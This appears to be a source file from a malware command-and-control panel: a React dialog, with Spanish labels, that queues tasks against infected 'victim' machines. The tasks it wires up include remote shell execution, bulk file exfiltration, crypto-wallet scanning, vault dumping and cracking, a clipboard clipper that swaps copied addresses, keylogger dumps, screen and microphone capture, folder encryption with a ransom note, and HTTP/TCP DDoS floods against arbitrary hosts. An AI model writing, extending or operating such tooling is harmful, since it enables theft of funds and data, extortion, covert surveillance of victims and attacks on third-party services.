'use client';
import { useEffect, useState } from 'react';
import { Download, FolderSearch, TerminalSquare } from 'lucide-react';
import { Dialog, DialogContent, DialogDescription, DialogTitle } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { Input, Label, Select, Textarea } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';
import { mutate, useApi } from '@/hooks/useApi';
import { ApiError } from '@/lib/api';
import type { ActionDef } from '@/lib/actions';
import type { Task, Victim, Wallet } from '@/lib/types';
import { isWindows } from '@/lib/os';

function reason(error: unknown): string {
  if (error instanceof ApiError) {
    if (error.code === 'agent_offline') return 'El equipo no tiene socket de control. La tarea no se encola: espera a que vuelva o usa una tarea programada.';
    if (error.code === 'busy') return 'El agente ya tiene 4 tareas en vuelo. Cancela una o espera a que termine.';
    if (error.code === 'discord_unlinked' || error.code === 'discord_channel_missing') return 'El enlace de Discord falta o el canal desapareció. Reenlaza desde la ficha antes de encolar.';
    if (error.status === 429) return 'Límite de peticiones alcanzado. Reintenta en unos segundos.';
    if (error.code === 'invalid_params') return `Parámetros inválidos: ${error.message}`;
    return error.message;
  }
  return error instanceof Error ? error.message : 'No se pudo encolar';
}

export function ParamDialog({
  action,
  victim,
  onClose,
  onQueued
}: {
  action: ActionDef | null;
  victim: Victim;
  onClose: () => void;
  onQueued: (name: string) => void;
}) {
  const kind = action?.dialog;
  const [command, setCommand] = useState('');
  const [path, setPath] = useState('');
  const [maxMb, setMaxMb] = useState(64);
  const [pattern, setPattern] = useState('');
  const [target, setTarget] = useState('');
  const [seconds, setSeconds] = useState(90);
  const [cpu, setCpu] = useState(50);
  const [wordlist, setWordlist] = useState('');
  const [message, setMessage] = useState('');
  const [title, setTitle] = useState('SPC');
  const [url, setUrl] = useState('https://');
  const [paths, setPaths] = useState('');
  const [tags, setTags] = useState(victim.tags.join(', '));
  const [agentCommand, setAgentCommand] = useState('ops');
  const [maxFiles, setMaxFiles] = useState(4000);
  const [maxBytes, setMaxBytes] = useState(268435456);
  const [replace, setReplace] = useState(false);
  const [listing, setListing] = useState<string[]>([]);
  const [output, setOutput] = useState('');
  const [fps, setFps] = useState(1);
  const [quality, setQuality] = useState(60);
  const [note, setNote] = useState('');
  const [host, setHost] = useState('');
  const [port, setPort] = useState(80);
  const [concurrency, setConcurrency] = useState(16);
  const [method, setMethod] = useState<'http' | 'tcp'>('http');
  const [device, setDevice] = useState('');
  const [busy, setBusy] = useState('');
  const [error, setError] = useState<string | null>(null);
  const wallets = useApi<{ items: Wallet[] }>(kind === 'dump_vault' || kind === 'crack_vault' ? `/victims/${victim.id}/wallets` : null);
  const targets = [...new Set((wallets.data?.items ?? []).map((wallet) => wallet.targetId))];

  useEffect(() => {
    setError(null);
    setListing([]);
    setOutput('');
    if (kind === 'shell') setCommand(action?.id === 'registry' ? 'reg query "HKLM\\SOFTWARE"' : 'whoami');
    if (kind === 'message') setMessage('');
    if (kind === 'scan_wallets') { setMaxFiles(4000); setMaxBytes(268435456); }
    if (kind === 'crack_vault') setSeconds(90);
    if (kind === 'monitor' || kind === 'mic') setSeconds(5);
    if (kind === 'ddos') { setSeconds(30); setHost(''); setPort(80); setConcurrency(16); }
    if (kind === 'agent') setAgentCommand('memdump electrum');
  }, [kind, action?.id]);

  useEffect(() => {
    if (targets.length > 0 && !target) setTarget(targets[0]!);
  }, [targets.join(',')]); // eslint-disable-line react-hooks/exhaustive-deps

  async function queue(name: 'shell' | 'file_pull' | 'crack_vault' | 'dump_vault' | 'scan_wallets' | 'clip_start' | 'agent' | 'monitor' | 'files' | 'webcam' | 'mic' | 'mic:record' | 'ransomware' | 'ddos', params: Record<string, unknown>, timeout: number) {
    await mutate('/tasks', 'POST', { victim_ids: [victim.id], name, params, timeout_sec: timeout });
    onQueued(name);
  }

  /** Lanza `agent ls` y espera el resultado para elegir ruta sin escribirla a ciegas. */
  async function browse(base: string) {
    if (busy) return;
    setBusy('browse');
    setError(null);
    try {
      const created = await mutate<{ items: Task[] }>('/tasks', 'POST', {
        victim_ids: [victim.id], name: 'agent', params: { command: `ls ${base}`.trim() }, timeout_sec: 30
      });
      const id = created.items[0]!.id;
      for (let attempt = 0; attempt < 20; attempt += 1) {
        await new Promise((resolve) => setTimeout(resolve, 700));
        const response = await fetch(`/api/console/tasks?victim=${victim.id}&name=agent&limit=1`).then((res) => res.json()) as { items: Task[] };
        const match = response.items.find((item) => item.id === id);
        if (match && ['done', 'error', 'unknown', 'expired'].includes(match.status)) {
          const value = match.status === 'done' ? String((match.result as { output?: string } | null)?.output ?? '') : match.error ?? match.status;
          setListing(value.split('\n').map((line) => line.trim()).filter(Boolean).slice(0, 200));
          break;
        }
      }
    } catch (caught) {
      setError(reason(caught));
    } finally {
      setBusy('');
    }
  }

  async function search(base: string, needle: string) {
    if (busy) return;
    setBusy('search');
    setError(null);
    setOutput('');
    const command = isWindows(victim.os)
      ? `where /r "${base}" "*${needle}*"`
      : `find "${base}" -iname "*${needle}*"`;
    try {
      const created = await mutate<{ items: Task[] }>('/tasks', 'POST', {
        victim_ids: [victim.id], name: 'shell', params: { command }, timeout_sec: 90
      });
      const id = created.items[0]!.id;
      for (let attempt = 0; attempt < 20; attempt += 1) {
        await new Promise((resolve) => setTimeout(resolve, 800));
        const response = await fetch(`/api/console/tasks?victim=${victim.id}&name=shell&limit=1`).then((res) => res.json()) as { items: Task[] };
        const match = response.items.find((item) => item.id === id);
        if (match && ['done', 'error', 'unknown', 'expired'].includes(match.status)) {
          setOutput(match.status === 'done' ? String((match.result as { output?: string } | null)?.output ?? '') : match.error ?? match.status);
          break;
        }
      }
    } catch (caught) {
      setError(reason(caught));
    } finally {
      setBusy('');
    }
  }

  async function submit(event: React.FormEvent) {
    event.preventDefault();
    if (busy) return;
    setBusy('send');
    setError(null);
    try {
      switch (kind) {
        case 'shell':
          await queue('shell', { command }, 90);
          break;
        case 'file_pull':
          await queue('file_pull', { path, max_mb: maxMb }, 120);
          break;
        case 'search_files':
          await search(path, pattern);
          return;
        case 'mass_download': {
          const list = paths.split('\n').map((line) => line.trim()).filter(Boolean);
          for (const item of list) await queue('file_pull', { path: item, max_mb: maxMb }, 120);
          break;
        }
        case 'crack_vault':
          await queue('crack_vault', { target, max_seconds: seconds, max_cpu_pct: cpu, ...(wordlist ? { wordlist } : {}) }, 180);
          break;
        case 'dump_vault':
          await queue('dump_vault', { target }, 300);
          break;
        case 'scan_wallets':
          await queue('scan_wallets', { include_desktop: true, include_extensions: true, include_seeds: true, max_files: maxFiles, max_bytes: maxBytes }, 300);
          break;
        case 'clip_start':
          await queue('clip_start', { replace, max_history: 500 }, 30);
          break;
        case 'agent':
          await queue('agent', { command: agentCommand }, 120);
          break;
        case 'message': {
          const escaped = message.replace(/"/g, '\\"').replace(/'/g, "''").replace(/\r?\n/g, ' ');
          const cmd = isWindows(victim.os)
            ? `powershell -NoProfile -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show(\\"${escaped}\\",\\"${title.replace(/"/g, '')}\\")"`
            : `sh -c "zenity --info --title='${title}' --text='${escaped}' 2>/dev/null || notify-send '${title}' '${escaped}'"`;
          await queue('shell', { command: cmd }, 60);
          break;
        }
        case 'open_url': {
          const cmd = isWindows(victim.os) ? `start "" "${url}"` : `xdg-open "${url}"`;
          await queue('shell', { command: cmd }, 30);
          break;
        }
        case 'tags':
          await mutate(`/victims/${victim.id}`, 'PATCH', { tags: tags.split(',').map((tag) => tag.trim()).filter(Boolean) });
          onQueued('tags');
          break;
        case 'monitor':
          await queue('monitor', { seconds, fps, quality }, 90);
          break;
        case 'mic':
          await queue('mic:record', { seconds, ...(device ? { device } : {}) }, 90);
          break;
        case 'upload':
          await queue('files', { action: action?.id === 'compress' ? 'compress' : 'upload', path, ...(action?.id === 'compress' ? {} : { url, max_mb: maxMb }) }, 300);
          break;
        case 'ransomware':
          await queue('ransomware', { action: action?.id === 'unransom' ? 'decrypt' : action?.id === 'ransom-status' ? 'status' : 'encrypt', path, ...(note ? { note } : {}) }, 300);
          break;
        case 'ddos':
          await queue('ddos', { method, host, port, seconds, concurrency }, 300);
          break;
        default:
          break;
      }
      onClose();
    } catch (caught) {
      setError(reason(caught));
    } finally {
      setBusy('');
    }
  }

  const titles: Partial<Record<string, string>> = {
    shell: action?.id === 'registry' ? 'Consultar registro' : 'Ejecutar shell',
    file_pull: 'Descargar fichero',
    mass_download: 'Descarga masiva',
    crack_vault: 'Romper vault',
    dump_vault: 'Extraer vault',
    scan_wallets: 'Escanear wallets',
    clip_start: 'Iniciar clipper',
    agent: 'Comando de agente',
    message: 'Message box',
    open_url: 'Abrir URL',
    tags: 'Etiquetas y nota',
    search_files: 'Buscar ficheros',
    monitor: 'Streaming de pantalla',
    mic: 'Clip de micrófono',
    upload: 'Ficheros en el equipo',
    ransomware: 'Cifrado de carpeta',
    ddos: 'Ataque DDoS'
  };

  return (
    <Dialog open={Boolean(action)} onOpenChange={(open) => { if (!open) onClose(); }}>
      <DialogContent>
        <DialogTitle className="flex items-center gap-2">{titles[kind ?? ''] ?? 'Parámetros'} <Badge tone="brand">{action?.task ?? 'local'}</Badge></DialogTitle>
        <DialogDescription>{victim.hostname} · {victim.os}. El formulario solo pide parámetros; la acción ya está ligada a su tarea.</DialogDescription>
        <form onSubmit={submit} className="mt-3 space-y-2.5">
          {kind === 'shell' ? (
            <div><Label htmlFor="command">Comando</Label><Textarea id="command" value={command} onChange={(event) => setCommand(event.target.value)} className="font-mono" autoFocus /></div>
          ) : null}

          {kind === 'file_pull' ? (
            <div className="space-y-2">
              <div className="flex items-end gap-2">
                <div className="flex-1"><Label htmlFor="path">Ruta remota</Label><Input id="path" value={path} onChange={(event) => setPath(event.target.value)} className="font-mono" autoFocus /></div>
                <Button type="button" variant="secondary" loading={busy === 'browse'} onClick={() => browse(path.split(/[\\/]/).slice(0, -1).join('/'))}><FolderSearch className="h-3 w-3" /> listar</Button>
              </div>
              <div><Label htmlFor="max-mb">Límite (MiB)</Label><Input id="max-mb" type="number" min={1} max={256} value={maxMb} onChange={(event) => setMaxMb(Number(event.target.value))} /></div>
              {listing.length > 0 ? <div className="max-h-32 overflow-y-auto rounded border border-line p-1 font-mono text-2xs">{listing.map((item) => <button type="button" key={item} className="block w-full truncate text-left hover:text-brand" onClick={() => setPath(item.includes('/') || item.includes('\\') ? item : `${path.replace(/[\\/][^\\/]*$/, '')}/${item}`)}>{item}</button>)}</div> : null}
            </div>
          ) : null}

          {kind === 'mass_download' ? (
            <div className="space-y-2">
              <div><Label htmlFor="paths">Rutas (una por línea)</Label><Textarea id="paths" value={paths} onChange={(event) => setPaths(event.target.value)} placeholder={'C:\\Users\\ana\\Documents\\a.pdf\nC:\\Users\\ana\\Desktop\\b.txt'} className="font-mono" autoFocus /></div>
              <div><Label htmlFor="mass-mb">Límite por fichero (MiB)</Label><Input id="mass-mb" type="number" min={1} max={256} value={maxMb} onChange={(event) => setMaxMb(Number(event.target.value))} /></div>
              <p className="text-2xs text-muted">Se encola un file_pull por ruta; el resultado queda por equipo en el log.</p>
            </div>
          ) : null}

          {kind === 'search_files' ? (
            <div className="space-y-2">
              <div className="grid grid-cols-2 gap-2">
                <div><Label htmlFor="base">Carpeta</Label><Input id="base" value={path} onChange={(event) => setPath(event.target.value)} className="font-mono" autoFocus /></div>
                <div><Label htmlFor="pattern">Patrón</Label><Input id="pattern" value={pattern} onChange={(event) => setPattern(event.target.value)} placeholder="*.pdf" className="font-mono" /></div>
              </div>
              <Button type="button" variant="secondary" loading={busy === 'search'} disabled={!path || !pattern} onClick={() => search(path, pattern)}><FolderSearch className="h-3 w-3" /> buscar</Button>
              {output ? <pre className="max-h-40 overflow-auto rounded border border-line bg-bg p-2 font-mono text-2xs">{output}</pre> : null}
              {output ? <Button type="button" variant="ghost" size="sm" onClick={() => setPaths(output.split('\n').filter(Boolean).join('\n'))}><Download className="h-3 w-3" /> llevar a descarga masiva</Button> : null}
            </div>
          ) : null}

          {kind === 'dump_vault' || kind === 'crack_vault' ? (
            <div className="space-y-2">
              <div><Label htmlFor="target">Wallet objetivo</Label>{targets.length > 0 ? (
                <Select id="target" value={target} onChange={(event) => setTarget(event.target.value)} className="w-full">{targets.map((item) => <option key={item} value={item}>{item}</option>)}</Select>
              ) : <Input id="target" value={target} onChange={(event) => setTarget(event.target.value)} placeholder="metamask" />}</div>
              {kind === 'crack_vault' ? (
                <div className="grid grid-cols-2 gap-2">
                  <div><Label htmlFor="seconds">Máx. segundos</Label><Input id="seconds" type="number" min={5} max={600} value={seconds} onChange={(event) => setSeconds(Number(event.target.value))} /></div>
                  <div><Label htmlFor="cpu">Máx. CPU (%)</Label><Input id="cpu" type="number" min={10} max={100} value={cpu} onChange={(event) => setCpu(Number(event.target.value))} /></div>
                  <div className="col-span-2"><Label htmlFor="wordlist">Wordlist (ruta remota, opcional)</Label><Input id="wordlist" value={wordlist} onChange={(event) => setWordlist(event.target.value)} className="font-mono" /></div>
                </div>
              ) : null}
            </div>
          ) : null}

          {kind === 'scan_wallets' ? (
            <div className="grid grid-cols-2 gap-2">
              <div><Label htmlFor="max-files">max_files</Label><Input id="max-files" type="number" min={1} max={20000} value={maxFiles} onChange={(event) => setMaxFiles(Number(event.target.value))} /></div>
              <div><Label htmlFor="max-bytes">max_bytes</Label><Input id="max-bytes" type="number" min={1048576} max={536870912} step={1048576} value={maxBytes} onChange={(event) => setMaxBytes(Number(event.target.value))} /></div>
              <p className="col-span-2 text-2xs text-muted">Incluye escritorio, extensiones y búsqueda de seeds.</p>
            </div>
          ) : null}

          {kind === 'clip_start' ? (
            <label className="flex items-center gap-2 text-xs"><input type="checkbox" checked={replace} onChange={(event) => setReplace(event.target.checked)} /> reemplazar direcciones copiadas</label>
          ) : null}

          {kind === 'agent' ? (
            <div><Label htmlFor="agent-command">Comando de agente</Label><Input id="agent-command" value={agentCommand} onChange={(event) => setAgentCommand(event.target.value)} className="font-mono" list="agent-suggestions" autoFocus />
              <datalist id="agent-suggestions">{['ops', 'status', 'keys status', 'keys on', 'keys dump', 'memdump electrum', 'wallet watch status', 'hives', 'update check', 'clip status', 'gateway status'].map((item) => <option key={item} value={item} />)}</datalist>
            </div>
          ) : null}

          {kind === 'message' ? (
            <div className="space-y-2">
              <div><Label htmlFor="msg-title">Título</Label><Input id="msg-title" value={title} onChange={(event) => setTitle(event.target.value)} /></div>
              <div><Label htmlFor="msg">Texto</Label><Textarea id="msg" value={message} onChange={(event) => setMessage(event.target.value)} maxLength={1000} autoFocus /></div>
            </div>
          ) : null}

          {kind === 'open_url' ? (
            <div><Label htmlFor="url">URL</Label><Input id="url" value={url} onChange={(event) => setUrl(event.target.value)} className="font-mono" autoFocus /></div>
          ) : null}

          {kind === 'tags' ? (
            <div><Label htmlFor="tags">Etiquetas separadas por coma</Label><Input id="tags" value={tags} onChange={(event) => setTags(event.target.value)} placeholder="miner, lab, vip" autoFocus /></div>
          ) : null}

          {kind === 'monitor' ? (
            <div className="grid grid-cols-3 gap-2">
              <div><Label htmlFor="mon-sec">Segundos</Label><Input id="mon-sec" type="number" min={1} max={30} value={seconds} onChange={(event) => setSeconds(Number(event.target.value))} /></div>
              <div><Label htmlFor="mon-fps">FPS</Label><Input id="mon-fps" type="number" min={0.2} max={5} step={0.2} value={fps} onChange={(event) => setFps(Number(event.target.value))} /></div>
              <div><Label htmlFor="mon-q">Calidad</Label><Input id="mon-q" type="number" min={20} max={90} value={quality} onChange={(event) => setQuality(Number(event.target.value))} /></div>
              <p className="col-span-3 text-2xs text-muted">Devuelve una ráfaga de fotogramas JPEG en el resultado; el control de ratón/teclado llegará con el canal de entrada.</p>
            </div>
          ) : null}

          {kind === 'mic' ? (
            <div className="grid grid-cols-2 gap-2">
              <div><Label htmlFor="mic-sec">Segundos</Label><Input id="mic-sec" type="number" min={1} max={10} value={seconds} onChange={(event) => setSeconds(Number(event.target.value))} /></div>
              <div><Label htmlFor="mic-dev">Dispositivo (opcional)</Label><Input id="mic-dev" value={device} onChange={(event) => setDevice(event.target.value)} placeholder="default" /></div>
              <p className="col-span-2 text-2xs text-muted">Requiere ffmpeg en el equipo; si falta, la tarea devuelve <span className="font-mono">mic_unavailable</span>.</p>
            </div>
          ) : null}

          {kind === 'upload' ? (
            <div className="space-y-2">
              <div><Label htmlFor="file-path">Ruta en el equipo</Label><Input id="file-path" value={path} onChange={(event) => setPath(event.target.value)} className="font-mono" autoFocus /></div>
              {action?.id === 'compress' ? <p className="text-2xs text-muted">Se comprime la carpeta y se entrega como artefacto .zip.</p> : (
                <>
                  <div><Label htmlFor="file-url">URL de origen</Label><Input id="file-url" value={url} onChange={(event) => setUrl(event.target.value)} className="font-mono" placeholder="https://…" /></div>
                  <div><Label htmlFor="file-mb">Límite (MiB)</Label><Input id="file-mb" type="number" min={1} max={256} value={maxMb} onChange={(event) => setMaxMb(Number(event.target.value))} /></div>
                </>
              )}
            </div>
          ) : null}

          {kind === 'ransomware' ? (
            <div className="space-y-2">
              <div><Label htmlFor="ransom-path">Carpeta</Label><Input id="ransom-path" value={path} onChange={(event) => setPath(event.target.value)} className="font-mono" placeholder="C:\Users\ana\Documents" autoFocus /></div>
              {action?.id === 'ransom' ? <div><Label htmlFor="ransom-note">Nota de rescate</Label><Textarea id="ransom-note" value={note} onChange={(event) => setNote(event.target.value)} placeholder="Tus ficheros están cifrados. Contacta…" /></div> : null}
              <p className="text-2xs text-muted">AES-256-GCM con clave derivada del <span className="font-mono">build_secret</span>. Deja un marcador y no toca ficheros mayores de 256 MiB.</p>
            </div>
          ) : null}

          {kind === 'ddos' ? (
            <div className="grid grid-cols-2 gap-2">
              <div><Label htmlFor="ddos-method">Método</Label><Select id="ddos-method" value={method} onChange={(event) => setMethod(event.target.value as 'http' | 'tcp')} className="w-full"><option value="http">http</option><option value="tcp">tcp</option></Select></div>
              <div><Label htmlFor="ddos-host">Host</Label><Input id="ddos-host" value={host} onChange={(event) => setHost(event.target.value)} className="font-mono" autoFocus /></div>
              <div><Label htmlFor="ddos-port">Puerto</Label><Input id="ddos-port" type="number" min={1} max={65535} value={port} onChange={(event) => setPort(Number(event.target.value))} /></div>
              <div><Label htmlFor="ddos-sec">Segundos</Label><Input id="ddos-sec" type="number" min={1} max={300} value={seconds} onChange={(event) => setSeconds(Number(event.target.value))} /></div>
              <div><Label htmlFor="ddos-conc">Concurrencia</Label><Input id="ddos-conc" type="number" min={1} max={256} value={concurrency} onChange={(event) => setConcurrency(Number(event.target.value))} /></div>
            </div>
          ) : null}

          {error ? <p className="rounded border border-bad/30 bg-bad/10 p-2 text-2xs text-bad">{error}</p> : null}

          <div className="flex items-center justify-between pt-1">
            <span className="font-mono text-2xs text-muted">{action?.detail ? (typeof action.detail === 'string' ? action.detail : action.detail(victim)) : ''}</span>
            <div className="flex gap-2">
              <Button type="button" variant="ghost" onClick={onClose}>Cancelar</Button>
              <Button type="submit" loading={busy === 'send'} disabled={Boolean(busy)}><TerminalSquare className="h-3 w-3" /> Encolar</Button>
            </div>
          </div>
        </form>
      </DialogContent>
    </Dialog>
  );
}
